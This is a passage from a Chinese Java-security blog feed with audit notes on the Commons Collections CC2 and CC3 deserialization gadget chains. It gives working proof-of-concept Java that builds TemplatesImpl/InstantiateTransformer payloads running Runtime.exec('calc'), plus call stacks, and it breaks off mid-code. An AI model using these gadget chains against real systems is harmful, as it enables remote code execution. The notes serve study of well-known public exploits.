       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>,comparator);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 反射给 size赋值</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>            size.setAccessible(<span class="hljs-literal">true</span>);<br>            size.set(priorityQueue,<span class="hljs-number">2</span>);<br>            <span class="hljs-comment">// 反射获取 queue</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>            queue.setAccessible(<span class="hljs-literal">true</span>);<br>            Object[] objects = &#123;<span class="hljs-string">&quot;lingx5&quot;</span>, <span class="hljs-string">&quot;lingx5&quot;</span>&#125;;<br>            queue.set(priorityQueue,objects);<br>            <span class="hljs-comment">// 反射给 priorityQueue的comparator变量赋值</span><br>            <span class="hljs-comment">//            Field field = priorityQueue.getClass().getDeclaredField(&quot;comparator&quot;);</span><br>            <span class="hljs-comment">//            field.setAccessible(true);</span><br>            <span class="hljs-comment">//            field.set(priorityQueue,comparator);</span><br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;CC2.ser&quot;</span>);<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);<br>            objectOutputStream.writeObject(priorityQueue);<br><br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;CC2.ser&quot;</span>);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);<br>            objectInputStream.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>也是可以成功执行的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406151100931.png" alt="image-20250406151100931"></p><p>当然 ysoserial 原作者 并没有使用 ChainedTransformer 来做过滤 而是使用了 我们熟知的 TemplateImpl 的类加载能力</p><h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>我们可以调用到 InvokerTransformer的transform() 方法，就意味着我们可以反射去执行我们想要的方法了，当然类加载也是可以的</p><p>添加依赖(当然也可以不用这个，自己写个恶意类，转换为字节数组即可)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.22.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ysoserialCC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvilBytes() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        evil.setSuperclass(ctClass.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        evil.makeClassInitializer().insertBefore(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        <span class="hljs-keyword">return</span> evil.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>            f.setAccessible(<span class="hljs-literal">true</span>);<br>            f.set(obj, value);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] bytes = getEvilBytes();<br>            <span class="hljs-comment">// 构造 TemplatesImpl 对象</span><br>            <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>            setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>);<br>            setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br><br>            <span class="hljs-comment">// 调用 getOutputProperties，原作者使用的 newTransformer()方法</span><br>            <span class="hljs-comment">// 注意只能是public的方法</span><br>            <span class="hljs-comment">// 因为InvokerTransformer.transform() 没有使用 getDeclaredMethod()和setAccessible(true)</span><br>            <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getOutputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>            <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer,<span class="hljs-literal">null</span>);<br>            <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>, comparator);<br>            setFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>            setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br>            <span class="hljs-comment">// 序列化</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>            objectOutputStream.writeObject(priorityQueue);<br>            <span class="hljs-comment">// 反序列化</span><br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>            objectInputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 InvokerTransformer#transform 中 反射调用</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406161705832.png" alt="image-20250406161705832"></p><p>实例化</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406161852477.png" alt="image-20250406161852477"></p><p>弹出计算器</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406161927185.png" alt="image-20250406161927185"></p><p>调用栈拿出来看一下吧</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getTransletInstance:</span><span class="hljs-number">456</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)<br><span class="hljs-symbol">newTransformer:</span><span class="hljs-number">486</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)<br><span class="hljs-symbol">getOutputProperties:</span><span class="hljs-number">507</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)<br><span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">498</span>, Method (java.lang.reflect)<br><span class="hljs-symbol">transform:</span><span class="hljs-number">129</span>, InvokerTransformer (org.apache.commons.collections4.functors)<br><span class="hljs-symbol">compare:</span><span class="hljs-number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)<br><span class="hljs-symbol">siftDownUsingComparator:</span><span class="hljs-number">721</span>, PriorityQueue (java.util)<br><span class="hljs-symbol">siftDown:</span><span class="hljs-number">687</span>, PriorityQueue (java.util)<br><span class="hljs-symbol">heapify:</span><span class="hljs-number">736</span>, PriorityQueue (java.util)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">796</span>, PriorityQueue (java.util)<br><span class="hljs-symbol">main:</span><span class="hljs-number">57</span>, ysoserialCC2 (<span class="hljs-keyword">com</span>.lingx5)<br></code></pre></td></tr></table></figure><p>我把 readObject() 的调用栈掐掉了，留下了链条的部分</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/news/9835">通俗易懂的Java Commons Collection 2分析-先知社区</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Apache-CC链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>Apache-CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-CC3 链审计笔记</title>
    <link href="/2025/04/06/java-CC3-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/04/06/java-CC3-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="java-CC3-链审计笔记"><a href="#java-CC3-链审计笔记" class="headerlink" title="java-CC3 链审计笔记"></a>java-CC3 链审计笔记</h1><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>来自 ysoserial</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Variation on CommonsCollections1 that uses InstantiateTransformer instead of</span><br><span class="hljs-comment"> * InvokerTransformer.</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>ysoserial 中只写了一段注释，意思是 <span style="color:#FF0000;"> 这是 CommonsCollections1 的一个变种，它使用了 InstantiateTransformer 而不是 InvokerTransformer </span></p><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>他说把 InvokerTransformer 换为了 InstantiateTransformer 我们来看看换的这个类，有什么能力</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406184244737.png" alt="image-20250406184244737"></p><p>可以发现，他的 transform 方法，可以获得构造器并实例化类。作为链条的尾部，肯定就是实现恶意类加载了</p><p>这里看了一下我的 jdk 版本，有点高了，关键的 AnnotationInvocationHandler#readObject 中 setValue 被删除了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406191059055.png" alt="image-20250406191059055"></p><p>我们用 CC6 改吧 ，原理其实是一样的，CC6 比 CC1 适用的 JDK 版本更高</p><p>CC6 链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">java.io.ObjectInputStream.readObject()<br>        java.util.HashMap.put()<br>        java.util.HashMap.hashCode()<br>            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()<br>            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()<br>                org.apache.commons.collections.map.LazyMap.get()<br>                    org.apache.commons.collections.functors.ChainedTransformer.transform()<br>                    org.apache.commons.collections.functors.InvokerTransformer.transform()<br>                        java.lang.reflect.Method.invoke()<br>                            java.lang.Runtime.exec()<br></code></pre></td></tr></table></figure><p>CC3 替换的链</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectInputStream</span><span class="hljs-selector-class">.readObject</span>()<br>        java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.put</span>()<br>        java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.hashCode</span>()<br>            org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span><span class="hljs-selector-class">.TiedMapEntry</span><span class="hljs-selector-class">.hashCode</span>()<br>            org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span><span class="hljs-selector-class">.TiedMapEntry</span><span class="hljs-selector-class">.getValue</span>()<br>                org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span><span class="hljs-selector-class">.get</span>()<br>                    org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.ChainedTransformer</span><span class="hljs-selector-class">.transform</span>()<br>                    org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span>.InstantiateTransformer<span class="hljs-selector-id">#transform</span><br>                    com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span><span class="hljs-selector-class">.trax</span>.TrAXFilter<span class="hljs-selector-id">#TrAXFilter</span><br>                    javax<span class="hljs-selector-class">.xml</span><span class="hljs-selector-class">.transform</span>.Templates<span class="hljs-selector-id">#newTransformer</span><br>                        java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span>()<br>                            java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span><span class="hljs-selector-class">.exec</span>()<br></code></pre></td></tr></table></figure><p>我们来分析一下</p><p>首先，InstantiateTransformer#transform 方法 具有创建类实例的能力，我们最先想到的看到还是 TemplateImpl 的类加载能力，不过需要调用它的 newTransformer() 或者 getOutputProperties() 方法</p><p>我们找到了 TrAXFilter 这个类的构造方法，可以看到他在实例化的时候，调用了 TemplateImpl#newTransformer 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406195810772.png" alt="image-20250406195810772"></p><p>这样一下子 我们就清晰了，我们只需要在 ChainedTransformer 的 iTransformers 数组中放入 <code>ConstantTransformer 封装的 TrAXFilter 类</code> 和 <code>InstantiateTransformer封装的TrAXFilter的构造器参数和值</code> 其实就是 TemplatesImpl 恶意类 </p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><blockquote><p><strong>注意：</strong></p><p>如果要显示调用 TemplateImpl#newTransformer() 进行验证的话，需要 <code>_factory</code> 不为空，也就是要给 <code>_factory</code> 反射赋值</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvilBytes() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> ctClass.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>        evil.setSuperclass(superClass);<br>        evil.makeClassInitializer().insertBefore(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        <span class="hljs-keyword">return</span> evil.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] bytes = getEvilBytes();<br>        <span class="hljs-comment">// 创建TemplatesImpl对象，这里没给 _factory 字段赋值，是因为TemplatesImpl的readObject会去赋值</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;evil&quot;</span>);<br>        <br>        <span class="hljs-comment">// 封装 transformers 经典的 CC6 链，不够就是 数组的参数有所改变</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>        &#125;;<br>        <span class="hljs-comment">// 执行ChainedTransformer.transform(Object)时，会调用到 TrAXFilter的构造函数</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-literal">null</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span 